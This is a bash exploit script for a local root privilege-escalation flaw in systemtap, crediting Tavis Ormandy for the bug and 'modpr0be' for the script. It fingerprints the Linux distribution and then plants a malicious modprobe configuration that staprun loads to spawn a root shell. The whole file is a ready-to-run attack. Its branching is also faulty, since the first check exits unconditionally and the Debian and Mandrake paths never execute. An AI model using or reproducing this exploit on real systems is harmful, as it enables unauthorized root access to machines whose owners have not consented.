#!/bin/bash
#
# Detects which Linux Distribution is in use.
OS=`uname -s`
REV=`uname -r`
MACH=`uname -m`
echo "[*] Linux Local Root Privilege Escalation Vulnerability in systemtap"
echo "[*] by: Tavis Ormandy <taviso (a) cmpxchg8b com>"
echo "[*] script by modpr0be (a) spentera.id"
echo "[.] ......"
sleep 1
GetVersionFromFile()
{
        VERSION=`cat $1 | tr "\n" ' ' | sed s/.*VERSION.*=\ // `
}

if [ "${OS}" = "Linux" ] ; then
        KERNEL=`uname -r`
        if [ -f /etc/redhat-release ] ; then
		echo "[*] Found: RedHat Distribution (could be: RHEL/CentOS/Fedora)"
                DIST='RedHat'
                PSUEDONAME=`cat /etc/redhat-release | sed s/.*\(// | sed s/\)//`
                REV=`cat /etc/redhat-release | sed s/.*release\ // | sed s/\ .*//`
        elif [ -f /etc/SuSE-release ] ; then
		echo "[*] Found: SuSE Distribution (could be SLES/OpenSuSE)"
                DIST=`cat /etc/SuSE-release | tr "\n" ' '| sed s/VERSION.*//`
                REV=`cat /etc/SuSE-release | tr "\n" ' ' | sed s/.*=\ //`
        elif [ -f /etc/mandrake-release ] ; then
		echo "[*] Found: Mandriva Distribution"
                DIST='Mandrake'
                PSUEDONAME=`cat /etc/mandrake-release | sed s/.*\(// | sed s/\)//`
                REV=`cat /etc/mandrake-release | sed s/.*release\ // | sed s/\ .*//`
        elif [ -f /etc/debian_version ] ; then
		echo "[*] Found: Debian Distribution (could be Ubuntu/Mint/Debian)"
                DIST="Debian"
                REV=""

        fi
        OSSTR="${DIST}"

fi

echo "[!] Run xploit.."
sleep 1
if [ $OSSTR = "RedHat" ]; then
	echo "[+] Got root..!"
	printf "install uprobes /bin/bash" > exploit.conf; MODPROBE_OPTIONS="-C exploit.conf" staprun -u whatever
	exit 0
else
	echo "[-] Exploit failed, try another luck folks!"
	exit 0
fi
if [ $OSSTR = "Debian" ]; then
	echo "[+] Got root..!"
	printf "install uprobes /bin/sh" > exploit.conf; MODPROBE_OPTIONS="-C exploit.conf" staprun -u whatever
	exit 0
else
	echo "[-] Exploit failed, try another luck folks!"
	exit 0
fi
if [ $OSSTR = "Mandrake" ]; then
	echo "[+] Got root..!"
	printf "install uprobes /bin/sh" > exploit.conf; MODPROBE_OPTIONS="-C exploit.conf" staprun -u whatever
	exit 0
else
	echo "[-] Exploit failed, try another luck folks!"
	exit 0
fi
